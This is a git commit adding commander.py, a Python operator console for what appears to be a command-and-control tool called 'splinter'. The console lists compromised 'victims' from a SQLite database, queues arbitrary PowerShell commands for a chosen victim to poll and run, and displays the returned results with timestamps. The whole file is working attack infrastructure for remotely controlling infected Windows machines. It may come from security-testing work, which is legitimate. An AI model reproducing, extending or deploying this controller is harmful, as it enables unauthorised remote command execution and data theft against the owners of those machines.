aa847848773d5a64a64299aef1e984ce593839ee
Geoff Jones <geoff.jones@cyberis.co.uk>
2018-12-18 22:55:17 +0000

    Create commander.py

---
+++ commander.py
@@ -0,0 +1,92 @@
+import sqlite3
+import texttable
+
+DB_STRING = "splinter.db"
+
+def main():
+    print("---------\n")
+    print("MAIN MENU")
+    print("---------\n")
+    c = ''
+    while not (c == "quit" or c == 'q'):
+        print("\nPossible commands:\n")
+        print("v - victims")
+        print("s - session <VICTIMID>")
+        print("q - quit\n")
+        c = input(">  ")
+
+        if c == 'victims' or c == 'v':
+            tab = texttable.Texttable()
+            tab.header(['UUID','Last Command Activity'])
+            for victim in listvictims():
+                tab.add_row(victim)
+            print(tab.draw())
+
+        if c.startswith('session ') or c.startswith('s '):
+            uuid = c.split(maxsplit = 1)[1]
+
+            vc = ''
+            while not (vc == "quit" or vc == 'q'): 
+                print("---------\n")
+                print("\nSESSION MENU")
+                print("------------")
+                print("\nPossible commands:\n")
+                print("c  - command")
+                print("lc - last_commands")
+                print("r - result")
+                print("q - quit\n")
+                vc = input(">> ")
+                    
+                if vc == 'c' or vc == 'command':
+                    print("Enter the command(s) you wish to run in PowerShell syntax below - Ctrl-D or Ctrl-Z ( windows ) to end\n")
+                    contents = []
+                    while True:
+                        try:
+                            line = input()
+                        except EOFError:
+                            break
+                        contents.append(line)
+                    id = command(uuid,'\n'.join(contents))
+                    print("Command accepted as ID",id)
+                     
+                if vc == 'lc' or vc == 'last_commands':
+                    tab = texttable.Texttable()
+                    tab.header(['ID','Command Issue Time','Polled Time','Response Time','Command'])
+                    print(last_commands(5,uuid))
+                    for lc in last_commands(5,uuid):
+                        tab.add_row(lc)
+                    print(tab.draw())
+
+                if vc.startswith('r ') or vc.startswith('result '):
+                    resultid = vc.split(maxsplit = 1)[1]
+                    ct,pt,rt,c,r = result(resultid)
+                    print("Timestamps:\n-----------\n\nCommand Time: {}\nPolled Time: {}\nResult Time: {}\n\nCommand:\n-----------\n\n{}\n\nResult:\n-----------\n\n{}".format(ct,pt,rt,c,r.decode("utf-8") ))
+
+def listvictims():
+     with sqlite3.connect(DB_STRING) as c:
+        r = c.execute("SELECT uuid, datetime(response_time, 'unixepoch', 'localtime') from commands c1 where response_time = (SELECT MAX(response_time) FROM commands c2 where c1.uuid = c2.uuid) group by uuid order by response_time DESC")
+        return r.fetchall()
+
+def command(victim,command):
+    with sqlite3.connect(DB_STRING) as c:
+        cur = c.cursor()
+        cur.execute("INSERT into commands (uuid, command_time, command) values (?, strftime('%s','now'), ?)", (victim,command))
+        return cur.lastrowid
+
+def result(id):
+    with sqlite3.connect(DB_STRING) as c:
+        r = c.execute("SELECT datetime(command_time, 'unixepoch', 'localtime'), datetime(poll_time, 'unixepoch', 'localtime'), datetime(response_time, 'unixepoch', 'localtime'), command, response from commands where rowid = ?", (id,))
+        return r.fetchone()
+
+def last_commands(count = 5, victim = None):
+    if not victim:
+        with sqlite3.connect(DB_STRING) as c:
+            r = c.execute("SELECT rowid, uuid, datetime(command_time, 'unixepoch', 'localtime'), datetime(poll_time, 'unixepoch', 'localtime'), datetime(response_time, 'unixepoch', 'localtime'), command from commands order by rowid DESC limit ?", (count,))
+            return r.fetchall()
+    else:
+        with sqlite3.connect(DB_STRING) as c:
+            r = c.execute("SELECT rowid, datetime(command_time, 'unixepoch', 'localtime'), datetime(poll_time, 'unixepoch', 'localtime'), datetime(response_time, 'unixepoch', 'localtime'), command from commands where uuid = ? order by rowid DESC limit ?", (victim,count))
+            return r.fetchall()
+
+if __name__ == "__main__":
+    main()
